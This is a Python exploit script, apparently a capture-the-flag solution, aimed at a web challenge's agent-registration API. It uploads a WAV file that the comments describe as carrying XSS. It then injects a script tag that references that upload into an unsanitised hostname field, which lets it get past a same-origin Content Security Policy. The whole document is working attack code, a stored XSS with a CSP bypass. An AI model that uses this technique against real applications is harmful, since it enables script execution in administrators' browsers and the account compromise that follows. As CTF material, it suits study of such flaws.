import requests
import json

proxies = {"http": "http://127.0.0.1:8080"}
BASE = 'http://68.183.37.122:32269/'

# Request a new agent and store the identifier and token
res = json.loads(requests.get(BASE + 'agents/register').text)
identifier = res['identifier']
token = res['token']

assert requests.get(f"{BASE}agents/check/{identifier}/{token}").text == 'OK'

# Malicous wav file with XSS inside
name = 'mal2.wav'
# upload the malicous wav file
guid = requests.post(f'{BASE}agents/upload/{identifier}/{token}', files = {'recording': ('rec.wav', open(name, 'rb'),'audio/wave',{})}, proxies=proxies).text

print(f"{BASE}uploads/{guid}")

# Set the to the uploaded file to bypass the Content Security Policy
# The security policy only accept script from self
# So the uploaded file will be count as self and the xss should work because hostname, platfrom, and arch will be embeded to panel.pug and the content didn't get santize

xss = f'<script src="/uploads/{guid}"></script>'
requests.post(f'{BASE}agents/details/{identifier}/{token}', data={'hostname':xss,'platform':'a','arch':'a'})
